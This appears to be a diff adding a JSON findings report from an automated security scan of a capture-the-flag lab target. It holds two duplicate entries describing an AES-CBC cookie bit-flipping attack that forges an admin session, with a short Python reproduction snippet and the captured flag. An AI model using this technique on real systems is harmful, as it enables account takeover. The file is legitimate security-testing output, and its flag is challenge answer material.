@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T11:56:06.091890+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "c13cb344-6563-4642-a2c0-726876e5ada0",
+      "timestamp": "2026-04-15T11:56:06.091782+00:00",
+      "title": "AES-CBC Cookie Bit-Flipping Attack - Admin Privilege Escalation",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58969",
+      "description": "The application uses AES-CBC encryption for session cookies without a MAC (encrypt-then-MAC or MAC-then-encrypt). This allows an attacker to perform a bit-flipping attack on the IV to modify the decrypted plaintext. By XOR-ing the IV bytes with the original username 'test1' and the target username 'admin', the attacker can escalate privileges to admin and access the flag.",
+      "evidence": "flag{60afd62a-6165-42f9-9b06-e45c453d2902}",
+      "tool_used": "python3",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "Original cookie: 865d4fd715348c5b828a882a290bbfb0093e57a94b0f1ec490735efcc2737992\nIV = cookie[:16], C1 = cookie[16:]\noriginal = b'test1', target = b'admin'\nnew_iv = bytearray(iv)\nfor i in range(5):\n    new_iv[i] = iv[i] ^ original[i] ^ target[i]\nnew_cookie = bytes(new_iv) + c1\n# Result: Welcome admin! Here is your flag: flag{60afd62a-6165-42f9-9b06-e45c453d2902}",
+        "expected": "flag{60afd62a-6165-42f9-9b06-e45c453d2902}"
+      }
+    },
+    {
+      "id": "a3baa8b8-929b-4c80-b9a0-87a51b87e304",
+      "timestamp": "2026-04-15T11:56:06.250728+00:00",
+      "title": "AES-CBC Cookie Bit-Flipping Attack - Admin Privilege Escalation",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58969",
+      "description": "The application uses AES-CBC encryption for session cookies without a MAC (encrypt-then-MAC or MAC-then-encrypt). This allows an attacker to perform a bit-flipping attack on the IV to modify the decrypted plaintext. By XOR-ing the IV bytes with the original username 'test1' and the target username 'admin', the attacker can escalate privileges to admin and access the flag.",
+      "evidence": "flag{60afd62a-6165-42f9-9b06-e45c453d2902}",
+      "tool_used": "python3",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "Original cookie: 865d4fd715348c5b828a882a290bbfb0093e57a94b0f1ec490735efcc2737992\nIV = cookie[:16], C1 = cookie[16:]\noriginal = b'test1', target = b'admin'\nnew_iv = bytearray(iv)\nfor i in range(5):\n    new_iv[i] = iv[i] ^ original[i] ^ target[i]\nnew_cookie = bytes(new_iv) + c1\n# Result: Welcome admin! Here is your flag: flag{60afd62a-6165-42f9-9b06-e45c453d2902}",
+        "expected": "flag{60afd62a-6165-42f9-9b06-e45c453d2902}"
+      }
+    }
+  ],
+  "diagrams": []
+}
